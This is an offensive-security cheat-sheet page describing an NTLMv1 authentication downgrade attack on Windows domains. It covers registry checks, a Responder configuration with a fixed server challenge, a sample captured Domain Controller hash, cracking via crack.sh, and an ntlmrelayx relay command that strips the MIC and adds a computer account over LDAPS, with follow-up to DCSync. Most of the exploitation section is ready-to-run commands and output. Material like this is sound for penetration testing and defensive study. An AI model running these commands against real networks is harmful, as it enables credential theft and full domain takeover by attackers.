**NTLMv1 authentication downgrade** — coerce a target (ideally a Domain Controller) to authenticate to you with the weak NTLMv1 protocol and a fixed server challenge, then recover the NT hash in minutes with rainbow tables (crack.sh) or relay the authentication elsewhere.

## Background

The default NTLM version depends on the Windows version, but it can be set by GPO (`Network security: LAN Manager authentication level`), stored under `HKLM\System\CurrentControlSet\Control\Lsa`.

| Setting | Value |
| --- | :---: |
| Send LM & NTLM responses | 0 |
| Send LM & NTLM - use NTLMv2 session security if negotiated | 1 |
| Send NTLM response only (clients use NTLMv1) | 2 |
| Send NTLMv2 response only | 3 |
| Send NTLMv2 response only. Refuse LM | 4 |
| Send NTLMv2 response only. Refuse LM & NTLM | 5 |

Values 0-2 leave clients using NTLMv1 and are exploitable.

## Discovery

There is no easy remote way to determine the NTLM version other than testing (see Exploitation). Locally, query the registry:

```console

C:\Windows\System32>reg.exe query HKLM\System\CurrentControlSet\Control\Lsa /v LmCompatibilityLevel
    LmCompatibilityLevel    REG_DWORD    0x3

```

## Exploitation

1. Edit Responder's `Responder.conf` to set `1122334455667788` as the fixed server challenge.

```txt

; Custom challenge.
; Use "Random" for generating a random challenge for each requests (Default)
;Challenge = Random
Challenge = 1122334455667788

```

2. Start Responder in analyze mode.

```bash

responder --lm -A -I INTERFACE

```

3. Coerce authentication over SMB - see [Coercing Authentication](Coercing%20Authentication.md).

Example capture:

```console

$ sudo responder --lm -A -I INTERFACE
[...]
[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[SMB] NTLMv1 Client   : 10.10.10.10
[SMB] NTLMv1 Username : DOMAIN\DC01$
[SMB] NTLMv1 Hash     : DC01$::DOMAIN:36D[...]6661:36D3[...]06661:1122334455667788

```

4. Submit the response at https://crack.sh/get-cracking/ to recover the NT hash.

Alternatively, since NTLMv1 does not support message integrity, the authentication can be relayed to another protocol even if signing is required (e.g. SMB to LDAP). Add `--remove-mic` to the ntlmrelayx command line:

```bash

ntlmrelayx.py -t 'ldaps://DC' --delegate-access --add-computer 'COMPUTER_NAME' -smb2support --remove-mic

```

5. Use the NT hash:
- Domain Controller: perform a DCSync - see [Dump NTDS.dit](../Credential%20Dumping/Dump%20NTDS.dit.md).
- Other machine targets: see [Computer Account to Local Admin](../Delegation%20Attacks/Computer%20Account%20to%20Local%20Admin.md).

## References

- Responder - https://github.com/lgandx/Responder
- Crack.sh - https://crack.sh/get-cracking/
- impacket - https://github.com/fortra/impacket
- NTLMv1 vs NTLMv2 - https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/
